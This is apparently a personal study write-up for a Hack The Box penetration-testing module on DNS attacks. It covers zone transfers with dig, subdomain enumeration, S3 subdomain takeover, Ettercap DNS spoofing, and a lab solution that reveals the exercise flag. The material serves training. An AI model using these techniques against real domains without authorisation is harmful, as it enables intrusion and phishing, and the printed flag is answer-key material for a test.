### CPTS / HTB Penetration Tester Path <br>
### Attacking Common Services - DNS Attacks & Vulnerabilities <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Attacking DNS



DNS - `UDP/53` (default), falls back to `TCP/53` for large packets / zone transfers.

Banner / version scan:

```diff
+ $ nmap -p53 -Pn -sV -sC 10.10.110.213
```

<br>

---

<br>

### DNS Zone Transfer



A misconfigured DNS server allows anyone to request a zone transfer (`AXFR`) - dumps the entire zone with all records. Uses `TCP/53`.

`dig` AXFR query:

```diff
+ $ dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
```

<br>

`fierce` - enumerate root NSes + try AXFR:

```diff
+ $ fierce --domain zonetransfer.me
```

<br>

---

<br>

### Subdomain Enumeration & Takeover



Subdomain takeover - a `CNAME` points to a third-party (S3, GitHub, Heroku, etc.) that no longer exists. Anyone who registers the dangling target controls that subdomain.

`subfinder` - passive scrape of OSINT sources:

```diff
+ $ ./subfinder -d inlanefreight.com -v
```

<br>

`subbrute` - DNS brute force using your own resolvers (works without internet):

```diff
+ $ git clone https://github.com/TheRook/subbrute.git
+ $ cd subbrute
+ $ echo "ns1.inlanefreight.com" > ./resolvers.txt
+ $ ./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
```

<br>

Check for dangling CNAMEs:

```diff
+ $ host support.inlanefreight.com
```

	support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com

If the S3 bucket returns `NoSuchBucket`, register it under the same name to take over the subdomain. Reference: [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz).

<br>

---

<br>

### DNS Spoofing / Cache Poisoning



Local-network DNS spoofing via `Ettercap`. Edit `/etc/ettercap/etter.dns`:

	inlanefreight.com      A   192.168.225.110
	*.inlanefreight.com    A   192.168.225.110

Steps in Ettercap GUI:
1. `Hosts > Scan for Hosts`
2. Add target IP to `Target1`, gateway to `Target2`
3. Activate `Plugins > Manage Plugins > dns_spoof`

<br>

---

<br>

### Latest DNS Vulnerabilities - Subdomain Takeover



[RedHuntLabs Project Resonance Wave 1 (2020)](https://redhuntlabs.com/blog/project-resonance-wave-1.html): 424,120 subdomains out of 220 million were vulnerable to takeover; 62% in e-commerce.

Risk: phishing campaigns appear to come from the official domain - customers trust the URL.

#### Concept - initiation:

| # | Step | Category |
|---|---|---|
| 1 | Discovered orphan subdomain (CNAME points nowhere). | `Source` |
| 2 | Attacker registers it on the third-party provider. | `Process` |
| 3 | Privileges sit with the original domain owner's DNS records. | `Privileges` |
| 4 | Attacker-controlled server is the destination. | `Destination` |

#### Concept - trigger forwarding (cycle restart):

| # | Step | Category |
|---|---|---|
| 5 | Visitor enters URL; outdated CNAME is the source. | `Source` |
| 6 | DNS resolves CNAME -> attacker site. | `Process` |
| 7 | DNS treats the record as trusted (admin-managed). | `Privileges` |
| 8 | Visitor's request is the destination. | `Destination` |

<br>

---

<br>

### DNS Exercise

IP: 10.129.203.6

Hint: use `subbrute` (GitHub).

---

### Question 1:
Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer.

#### Add target IP and domains to `/etc/hosts`:

```diff
+ $ sudo nano /etc/hosts
```

	10.129.203.6    ns1.inlanefreight.htb     inlanefreight.htb

#### Set the resolver, then run subbrute:

```diff
+ $ echo "ns1.inlanefreight.htb" > resolvers.txt
+ $ python3 subbrute.py inlanefreight.htb -s names.txt -r resolvers.txt
```

	inlanefreight.htb
	hr.inlanefreight.htb

#### AXFR against the discovered subdomain:

```diff
+ $ dig AXFR @inlanefreight.htb hr.inlanefreight.htb
```

	hr.inlanefreight.htb.   604800  IN      TXT     "HTB{LUIHNFAS2871SJK1259991}"

&#x1F6A9; found **HTB{LUIHN--edit--FAS2871SJK1259991}**.
